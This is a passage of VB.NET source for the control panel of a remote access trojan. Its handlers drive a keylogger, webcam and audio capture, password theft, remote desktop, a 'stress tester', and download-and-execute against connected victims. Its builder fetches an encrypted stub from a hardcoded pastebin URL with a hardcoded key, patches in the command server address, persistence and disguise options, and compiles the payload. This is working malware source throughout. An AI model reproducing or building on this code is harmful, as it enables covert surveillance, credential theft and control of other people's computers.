            lw.SubItems.Add(line.Split("|")(2))
            lw.Group = CheckGroup(line.Split("|")(0))
            SystemInformation.ListView_Startup.Items.Add(lw)
        Next
    End Sub
    Function CheckGroup(ByVal txt As String)
        If txt = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" Then
            Return Groups(0)
        ElseIf txt = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" Then
            Return Groups(1)
        ElseIf txt = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" Then
            Return Groups(2)
        ElseIf txt = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" Then
            Return Groups(3)
        Else
            If alreadygroup = True Then
                Return Groups(4)
            Else
                Groups(4) = New ListViewGroup(txt, HorizontalAlignment.Left)
                SystemInformation.ListView_Startup.Groups.Add(Groups(4))
                alreadygroup = True
                Return Groups(4)
            End If
        End If
    End Function
    Sub AddDrives(ByVal txt As String)
        Try
            For i = 0 To CountCharacter(txt, "|") - 1
                SystemInformation.ComboBox1.Items.Add(txt.Split("|")(i))
            Next
        Catch
        End Try
    End Sub
    Sub AddFiles(ByVal txt As String)
        Try
            path = txt.Split("|")(0)

            SystemInformation.TextBox1.Text = path.Remove(0, 3)

            txt = txt.Replace(txt.Split("|")(0) & "|", "")

            Dim ItemLines As New TextBox
            ItemLines.Text = txt
            For Each line As String In ItemLines.Lines
                Dim text() As String = line.Split("|")

                Dim ItemName As String = text(0)
                Dim SubItem1 As String = text(1)
                Dim SubItem2 As String = text(2)
                Dim SubItem3 As String = text(3)
                Dim SubItem4 As String = text(4)

                If SubItem4 = "1" Then
                    With SystemInformation.ListView_Files.Items.Add(ItemName, 0)
                        .SubItems.Add(SubItem1)
                        .SubItems.Add(SubItem2)
                        .SubItems.Add(SubItem3)
                        .SubItems.Add(SubItem4)
                    End With
                ElseIf SubItem4 = "0" Then
                    If ItemName.Contains(".exe") Or ItemName.Contains(".EXE") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 1)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".xls") Or ItemName.Contains(".XLS") Or ItemName.Contains(".xlt") Or ItemName.Contains(".XLT") Or ItemName.Contains(".XLTX") Or ItemName.Contains(".xltx") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 3)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".swf") Or ItemName.Contains(".SWF") Or ItemName.Contains(".flv") Or ItemName.Contains(".FLV") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 4)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".htm") Or ItemName.Contains(".HTM") Or ItemName.Contains(".html") Or ItemName.Contains(".HTML") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 5)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".ai") Or ItemName.Contains(".AI") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 6)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".aac") Or ItemName.Contains(".AAC") Or ItemName.Contains(".m4a") Or ItemName.Contains(".M4A") Or ItemName.Contains(".mp3") Or ItemName.Contains(".MP3") Or ItemName.Contains(".wav") Or ItemName.Contains(".WAV") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 7)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".pdf") Or ItemName.Contains(".PDF") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 8)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".psd") Or ItemName.Contains(".PSD") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 9)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".php") Or ItemName.Contains(".php3") Or ItemName.Contains(".phtml") Or ItemName.Contains(".PHP") Or ItemName.Contains(".PHTML") Or ItemName.Contains(".PHP3") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 10)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".ppt") Or ItemName.Contains(".PPT") Or ItemName.Contains(".PPTX") Or ItemName.Contains(".pptx") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 11)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".sln") Or ItemName.Contains(".SLN") Or ItemName.Contains(".user") Or ItemName.Contains(".USER") Or ItemName.Contains(".PDB") Or ItemName.Contains(".pdb") Or ItemName.Contains(".RESX") Or ItemName.Contains(".resx") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 12)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".doc") Or ItemName.Contains(".DOC") Or ItemName.Contains(".docx") Or ItemName.Contains(".DOCX") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 13)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".xaml") Or ItemName.Contains(".XAML") Or ItemName.Contains(".xml") Or ItemName.Contains(".XML") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 14)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".bfc") Or ItemName.Contains(".BFC") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 15)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".sql") Or ItemName.Contains(".SQL") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 16)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".pst") Or ItemName.Contains(".PST") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 18)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".3gpp") Or ItemName.Contains(".3GPP") Or ItemName.Contains(".avi") Or ItemName.Contains(".AVI") Or ItemName.Contains(".mp4") Or ItemName.Contains(".MP4") Or ItemName.Contains(".mov") Or ItemName.Contains(".MOV") Or ItemName.Contains(".mpeg") Or ItemName.Contains(".MPEG") Or ItemName.Contains(".WMA") Or ItemName.Contains(".wma") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 19)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".zip") Or ItemName.Contains(".ZIP") Or ItemName.Contains(".rar") Or ItemName.Contains(".RAR") Or ItemName.Contains(".tar.gz") Or ItemName.Contains(".TAR.GZ") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 20)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".jpeg") Or ItemName.Contains(".JPEG") Or ItemName.Contains(".jpg") Or ItemName.Contains(".JPG") Or ItemName.Contains(".gif") Or ItemName.Contains(".GIF") Or ItemName.Contains(".bmp") Or ItemName.Contains(".BMP") Or ItemName.Contains(".png") Or ItemName.Contains(".PNG") Or ItemName.Contains(".ico") Or ItemName.Contains(".ICO") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 21)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".rb") Or ItemName.Contains(".RB") Or ItemName.Contains(".py") Or ItemName.Contains(".PY") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 22)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".vb") Or ItemName.Contains(".VB") Or ItemName.Contains(".cs") Or ItemName.Contains(".CS") Or ItemName.Contains(".BAT") Or ItemName.Contains(".bat") Or ItemName.Contains(".CMD") Or ItemName.Contains(".cmd") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 2)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    ElseIf ItemName.Contains(".txt") Or ItemName.Contains(".TXT") Then
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 24)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    Else
                        With SystemInformation.ListView_Files.Items.Add(ItemName, 17)
                            .SubItems.Add(SubItem1)
                            .SubItems.Add(SubItem2)
                            .SubItems.Add(SubItem3)
                            .SubItems.Add(SubItem4)
                        End With
                    End If
                End If
            Next
        Catch
        End Try
    End Sub
    Sub AddWebcamDevices(ByVal txt As String)
        For i = 0 To CountCharacter(txt, "|") - 1
            RemoteWebcam.ComboBox1.Items.Add(txt.Split("|")(i))
        Next
    End Sub
    Sub AddThumbnail(ByVal txt As String, ByVal client As Connection)
        Thumbnails.AddThumbNail(client.IPAddress.ToString(), txt)
    End Sub
    Private Sub PingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PingToolStripMenuItem.Click
        Try
            Dim pingSender As Ping = New Ping()
            Dim reply As PingReply = pingSender.Send(ListView1.SelectedItems.Item(0).SubItems(1).Text, 3000)
            ListView1.SelectedItems.Item(0).SubItems(8).Text = reply.RoundtripTime & "/ms"
        Catch
        End Try
    End Sub
    Sub AddWebcam(ByVal txt As String)
        RemoteWebcam.PictureBox1.Image = ByteArray2Image(New Encryption().DecryptBase64(txt))
        'RemoteWebcam.StartToolStripMenuItem.PerformClick()
    End Sub
    Sub AddService(ByVal txt As String)
        Try
            Dim ItemLines As New TextBox
            ItemLines.Text = txt
            SystemInformation.ListView_Service.Items.Clear()
            For Each line As String In ItemLines.Lines
                Dim text() As String = line.Split("|")

                Dim ItemName As String = text(0)
                Dim SubItem1 As String = text(1)
                Dim SubItem2 As String = text(2)
                Dim SubItem3 As String = text(3)

                Dim Item As New ListViewItem(ItemName, 0)

                Item.SubItems.Add(SubItem1)
                Item.SubItems.Add(SubItem2)
                Item.SubItems.Add(SubItem3)

                SystemInformation.ListView_Service.Items.AddRange(New ListViewItem() {Item})
            Next
        Catch
        End Try
    End Sub
#End Region
#Region "Right Click"
    Private Sub SystemInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemInformationToolStripMenuItem.Click
        Try
            curntuser = ListView1.SelectedItems.Item(0).SubItems(4).Text
            SystemInformation.Text = "System Information - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            SystemInformation.connected = ListView1.SelectedItems.Item(0).Tag
            SystemInformation.Show()
        Catch
        End Try
    End Sub
    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        Try
            RemoteDesktop.connected = ListView1.SelectedItems.Item(0).Tag
            RemoteDesktop.Text = "Remote Desktop - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            RemoteDesktop.Show()
        Catch
        End Try
    End Sub
    Private Sub MapViewToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MapViewToolStripMenuItem.Click
        Try
            If ListView1.SelectedItems.Count = 1 Then
                MapView.connected += ListView1.SelectedItems.Item(0).SubItems(1).Text & "|"
                MapView.Text = "MapView - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
                GoTo jump
            End If
            For Each item As ListViewItem In ListView1.SelectedItems
                MapView.connected += item.SubItems(1).Text & "|"
            Next
Jump:       MapView.Show()
        Catch
        End Try
    End Sub
    Private Sub StressTesterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StressTesterToolStripMenuItem.Click
        Try
            For Each item As ListViewItem In ListView1.SelectedItems
                StressTester.connected(StressTester.amount) = item.Tag
                StressTester.amount += 1
            Next
            StressTester.Show()
        Catch
        End Try
    End Sub
    Private Sub RemoteKeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteKeyloggerToolStripMenuItem.Click
        Try
            Keylogger.connected = ListView1.SelectedItems.Item(0).Tag
            Keylogger.Text = "Keylogger - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            Keylogger.Show()
        Catch
        End Try
    End Sub
    Private Sub AudioCaptureToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AudioCaptureToolStripMenuItem.Click
        Try
            Audio.connected = ListView1.SelectedItems.Item(0).Tag
            Audio.Text = "Audio Capture - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            Audio.Show()
        Catch
        End Try
    End Sub
    Private Sub PasswordRecoveryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordRecoveryToolStripMenuItem.Click
        Try
            paswdrec.connected = ListView1.SelectedItems.Item(0).Tag
            paswdrec.Text = "Password Recovery - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            paswdrec.Show()
        Catch
        End Try
    End Sub
    Private Sub RemoteWebcamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteWebcamToolStripMenuItem.Click
        Try
            RemoteWebcam.connected = ListView1.SelectedItems.Item(0).Tag
            RemoteWebcam.Text = "Remote Webcam - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            RemoteWebcam.Show()
        Catch
        End Try
    End Sub
    Private Sub RemoteChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteChatToolStripMenuItem.Click
        RemoteChat.myname = InputBox("Please enter your Name!", "Enter your name")
        RemoteChat.connected = ListView1.SelectedItems.Item(0).Tag
        RemoteChat.Text = "Remote Chat - " & ListView1.SelectedItems.Item(0).SubItems(3).Text
        RemoteChat.Show()
    End Sub
    Private Sub MessageBoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessageBoxToolStripMenuItem.Click
        Try
            ShowMsgBox.calledfromuserinput = True
            ShowMsgBox.connected = ListView1.SelectedItems.Item(0).Tag
            ShowMsgBox.Show()
        Catch
        End Try
    End Sub
    Private Sub ScriptingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScriptingToolStripMenuItem.Click
        Try
            Scripting.connected = ListView1.SelectedItems.Item(0).Tag
            Scripting.Text = "Scripting - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            Scripting.Show()
        Catch
        End Try
    End Sub
    Private Sub MiscellaneousToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles MiscellaneousToolStripMenuItem1.Click
        Try
            Misc.connected = ListView1.SelectedItems.Item(0).Tag
            Misc.Text = "Miscellaneous - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            Misc.Show()
        Catch
        End Try
    End Sub
    Private Sub ViewThumbnailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewThumbnailsToolStripMenuItem.Click
        Try
            Thumbnails.Show()
        Catch
        End Try
    End Sub
    Private Sub FunFunctionsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FunFunctionsToolStripMenuItem.Click
        Try
            FunManager.connected = ListView1.SelectedItems.Item(0).Tag
            FunManager.Text = "Fun Manager - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            FunManager.Show()
        Catch
        End Try
    End Sub
#End Region
#Region "OnConnect"
    Private Sub OpenUrlToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenUrlToolStripMenuItem.Click
        Dim res As String = InputBox("Please enter an URL!", "Open Website")
        If res = "" Then
            Exit Sub
        Else
            With ListViewOnConnect.Items.Add("Open Website")
                .SubItems.Add(res)
                .SubItems.Add("Enabled")
            End With
        End If
    End Sub
    Private Sub DownloadExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadExecuteToolStripMenuItem.Click
        Dim res As String = InputBox("Please enter a direct Download Link to an .exe!", "Download & Execute")
        If res = "" Or Not res.Contains(".exe") Then
            Exit Sub
        Else
            With ListViewOnConnect.Items.Add("Download & Execute")
                .SubItems.Add(res)
                .SubItems.Add("Enabled")
            End With
        End If
    End Sub
    Private Sub RemoveActionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveActionToolStripMenuItem.Click
        Try
            ListViewOnConnect.Items.RemoveAt(ListViewOnConnect.SelectedItems.Item(0).Index)
        Catch
        End Try
    End Sub
    Private Sub DisableActionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisableActionToolStripMenuItem.Click
        Try
            If ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Enabled" Then
                ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Disabled"
            End If
        Catch
        End Try
    End Sub
    Private Sub EnableActionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableActionToolStripMenuItem.Click
        Try
            If ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Disabled" Then
                ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Enabled"
            End If
        Catch
        End Try
    End Sub
    Private Sub ShoweMessageBoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShoweMessageBoxToolStripMenuItem.Click
        ShowMsgBox.Show()
    End Sub
#End Region
#Region "Miscellaneous"
    Sub HostsFile(ByVal txt As String)
        Misc.RichTextBox1.Text = txt
    End Sub
    Sub CPImage(ByVal txt As String)
        Dim b() As Byte = New Encryption().DecryptBase64(txt)
        Misc.pb_cpimage.Image = ByteArray2Image(b)
    End Sub
    Sub CPText(ByVal txt As String)
        Misc.RichTextBox2.Text = txt
    End Sub
    Sub Shell(ByVal txt As String)
        Misc.RichTextBox3.AppendText(txt & vbCrLf)
        Misc.RichTextBox3.ScrollToCaret()
    End Sub
#End Region
#Region "Server Options"
    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim url As String = InputBox("Please enter a direct Link to your updated server.exe", "Update Server from URL")
            If url = String.Empty Or Not Microsoft.VisualBasic.Right(url, 4) = ".exe" Then Exit Sub
            SendToSelected(New Encryption().AES_Encrypt("UpdateFromLink" & url, enckey))
        Catch
        End Try
    End Sub
    Private Sub FromFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromFileToolStripMenuItem.Click
        Try
            Using ofd As New OpenFileDialog
                With ofd
                    .Filter = "Executables | *.exe"
                    .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    .Multiselect = False
                    .Title = "Select a File..."
                    Dim res = .ShowDialog()

                    If res = Windows.Forms.DialogResult.OK Then
                        SendToSelected(New Encryption().AES_Encrypt("UpdatefromFile" & New Encryption().EncryptBase64(File.ReadAllBytes(ofd.FileName)), enckey))
                    End If
                End With
            End Using
        Catch
        End Try
    End Sub
    Private Sub FromFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromFileToolStripMenuItem1.Click
        Try
            Using ofd As New OpenFileDialog
                With ofd
                    .Filter = "Executables | *.exe"
                    .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    .Multiselect = False
                    .Title = "Select a File..."
                    Dim res = .ShowDialog()

                    If res = Windows.Forms.DialogResult.OK Then
                        SendToSelected(New Encryption().AES_Encrypt("ExecutefromFile" & New Encryption().EncryptBase64(File.ReadAllBytes(ofd.FileName)), enckey))
                    End If
                End With
            End Using
        Catch
        End Try
    End Sub
    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim url As String = InputBox("Please enter a direct Link to a .exe", "Execute File from URL")
            If url = String.Empty Or Not Microsoft.VisualBasic.Right(url, 4) = ".exe" Then Exit Sub
            SendToSelected(New Encryption().AES_Encrypt("ExecuteFromLink" & url, enckey))
        Catch
        End Try
    End Sub
    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("Restart", enckey))
        Catch
        End Try
    End Sub
    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("Uninstall", enckey))
        Catch
        End Try
    End Sub
#End Region
#Region "Builder"
    Private Sub RandomPool1_CharacterSelection(s As Object, c As Char) Handles RandomPool1.CharacterSelection
        tb_mutex.Text += c.ToString()
    End Sub
    Public Function PreFilterMessage(ByRef m As System.Windows.Forms.Message) As Boolean Implements IMessageFilter.PreFilterMessage
        If m.Msg = WM_DROPFILES Then
            Dim nfiles As Integer = DragQueryFile(m.WParam, -1, Nothing, 0)
            Dim i As Integer
            For i = 0 To nfiles
                Dim sb As StringBuilder = New StringBuilder(256)
                DragQueryFile(m.WParam, i, sb, 256)
                HandleDroppedFiles(sb.ToString())
            Next
            DragFinish(m.WParam)
            Return True
        End If
        Return False
    End Function
    Public Sub HandleDroppedFiles(ByVal file As String)
        If Len(file) > 0 Then
            LoadPicture(file)
        End If
    End Sub
    Public Function LoadPicture(ByVal File As String) As Boolean
        Dim i As New FileInfo(File)
        If Not i.Extension = ".ico" Then
            Label18.Text = "Please select an Icon!"
        Else
            PictureBox1.ImageLocation = File
            icnpath = File
            Label18.Text = " Drag ´n Drop here"
        End If
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles btn_build.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .Filter = "Executables | *.exe"
                .InitialDirectory = Application.StartupPath
                .Title = "Save server..."
                Dim res = .ShowDialog()
                If Not res = Windows.Forms.DialogResult.OK Then
                    Exit Sub
                End If
            End With

            compileserver = New Thread(Sub() compilestub(sfd.FileName))
            compileserver.Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Sub compilestub(ByVal sfdfilename As String)
        Try
            'Stub URL http://pastebin.com/raw.php?i=NNJmzryK
            'Stub Key' J_s<eg1x_gF@1ie%EH4qC8?=:8[EnR 
            RichTextBox1.AppendText(Gettime() & "Connecting to Cloud..." & vbCrLf)
            Dim source As String = New WebClient().DownloadString("http://pastebin.com/raw.php?i=NNJmzryK")

            Dim cleansource As String = New Encryption().RijndaelDecrypt(source, "J_s<eg1x_gF@1ie%EH4qC8?=:8[EnR")


            RichTextBox1.AppendText(Gettime() & "Downloading Stub..." & vbCrLf)

            cleansource = cleansource.Replace("IPFUCKINGADDRESS", tb_ip.Text)
            cleansource = cleansource.Replace("4431", NumericUpDown2.Value)
            cleansource = cleansource.Replace("SINGLE_INSTANCE_APP_MUTEX", tb_mutex.Text)
            cleansource = cleansource.Replace("VEKEGFZKE", cb_installenable.CheckState)
            cleansource = cleansource.Replace("HFFguD", Check_CheckedRadioButtons())
            cleansource = cleansource.Replace("BCIEZTC", cb_dropinsubfolder.CheckState)
            cleansource = cleansource.Replace("VJKFZGUIZG", tb_subfoldername.Text)
            cleansource = cleansource.Replace("GTUIER", cb_persistence.CheckState)
            cleansource = cleansource.Replace("GUER", tb_execname.Text) ' .exe
            cleansource = cleansource.Replace("BCHJEIK", cb_enablestartup.CheckState)
            cleansource = cleansource.Replace("GERIU", rb_Startupfolder.Checked)
            cleansource = cleansource.Replace("BURE", rb_hkeyuser.Checked)
            cleansource = cleansource.Replace("IUEQ", rb_hkeylocal.Checked)
            cleansource = cleansource.Replace("BEUORF", cb_melt.CheckState)
            cleansource = cleansource.Replace("VWIUF", cb_delay.CheckState)
            cleansource = cleansource.Replace("GTREIGTF", nud_delay.Value)
            cleansource = cleansource.Replace("ASSEMBLYTITLE", tb_assemblytitle.Text)
            cleansource = cleansource.Replace("ASSEMBLYDESCRIPTION", tb_assemblydescription.Text)
            cleansource = cleansource.Replace("ASSEMBLYCOMPANY", tb_assemblycompany.Text)
            cleansource = cleansource.Replace("ASSEMBLYPRODUCT", tb_assemblyproduct.Text)
            cleansource = cleansource.Replace("ASSEMBLYCOPYRIGHT", tb_assemblycopyright.Text)
            cleansource = cleansource.Replace("ASSEMBLYTRADEMARK", tb_assemblytrademark.Text)
            cleansource = cleansource.Replace("3.5.2.4", tb_assemblyversion.Text)
            cleansource = cleansource.Replace("0.0.0.0", tb_assemblyfileversion.Text)

            RichTextBox1.AppendText(Gettime() & "Compiling Stub..." & vbCrLf)

            Dim objCodeCompiler As System.CodeDom.Compiler.ICodeCompiler = New VBCodeProvider().CreateCompiler()

            Dim objCompilerParameters As New System.CodeDom.Compiler.CompilerParameters()

            objCompilerParameters.ReferencedAssemblies.Add("System.dll")
            objCompilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
            objCompilerParameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            objCompilerParameters.ReferencedAssemblies.Add("System.Management.dll")
            objCompilerParameters.ReferencedAssemblies.Add("System.Drawing.dll")
            objCompilerParameters.ReferencedAssemblies.Add("System.ServiceProcess.dll")

            objCompilerParameters.GenerateExecutable = True
            objCompilerParameters.OutputAssembly = sfdfilename
            objCompilerParameters.CompilerOptions = "/target:winexe"
            If Not IsNothing(PictureBox1.Image) Then objCompilerParameters.CompilerOptions &= " /win32icon:" & icnpath

            Dim objCompileResults As System.CodeDom.Compiler.CompilerResults = objCodeCompiler.CompileAssemblyFromSource(objCompilerParameters, cleansource)

            If objCompileResults.Errors.HasErrors Then
                Dim ErrorString As String = "Compiler error:"
                For Each Err As CompilerError In objCompileResults.Errors
                    ErrorString &= Err.ToString & vbCrLf
                Next
                MsgBox(ErrorString, MsgBoxStyle.OkOnly, "Error while compiling")
            End If

            RichTextBox1.AppendText(Gettime() & "Stub Compiled and saved at " & sfdfilename & vbCrLf)

            If cb_compress.CheckState = CheckState.Checked Then
                IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\compress.bat", String.Format("cd {0}" & vbCrLf & "Rpx.exe {1}", Chr(34) & Application.StartupPath & "\Compressor\" & Chr(34), Chr(34) & sfdfilename & Chr(34)))
                RichTextBox1.AppendText(Gettime() & "Compressing Stub..." & vbCrLf)
                Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\compress.bat")
            End If
            RichTextBox1.ScrollToCaret()
        Catch
        End Try
    End Sub
    Function Gettime()
        Return "[" & My.Computer.Clock.LocalTime.Hour & ":" & My.Computer.Clock.LocalTime.Minute & ":" & My.Computer.Clock.LocalTime.Second & "] "
    End Function
    Function Check_CheckedRadioButtons()
        If rb_appdata.Checked Then
            Return rb_appdata.Text
        ElseIf rb_appdataroaming.Checked Then
            Return rb_appdataroaming.Text
        ElseIf rb_programfiles.Checked Then
            Return rb_programfiles.Text
        ElseIf rb_programs.Checked Then
            Return rb_programs.Text
        ElseIf rb_temp.Checked Then
            Return rb_temp.Text
        End If
    End Function
    Private Sub cb_installenable_CheckedChanged(sender As Object, e As EventArgs) Handles cb_installenable.CheckedChanged
        If cb_installenable.CheckState = CheckState.Checked Then
            rb_appdata.Enabled = True
            rb_appdataroaming.Enabled = True
            rb_programfiles.Enabled = True
            rb_programs.Enabled = True
            rb_temp.Enabled = True
            cb_dropinsubfolder.Enabled = True
            tb_execname.Enabled = True
        Else
            rb_appdata.Enabled = False
            rb_appdataroaming.Enabled = False
            rb_programfiles.Enabled = False
            rb_programs.Enabled = False
            rb_temp.Enabled = False
            cb_dropinsubfolder.Enabled = False
            tb_execname.Enabled = False

            rb_appdata.Checked = False
            rb_appdataroaming.Checked = False
            rb_programfiles.Checked = False
            rb_programs.Checked = False
            rb_temp.Checked = False
            cb_dropinsubfolder.Checked = False
            tb_execname.Text = "Executable Name.exe"
        End If
    End Sub
    Private Sub cb_dropinsubfolder_CheckedChanged(sender As Object, e As EventArgs) Handles cb_dropinsubfolder.CheckedChanged
        If cb_dropinsubfolder.CheckState = CheckState.Checked Then
            tb_subfoldername.Enabled = True
        Else
            tb_subfoldername.Enabled = False
            tb_subfoldername.Text = "Subfolder Name"
        End If
    End Sub
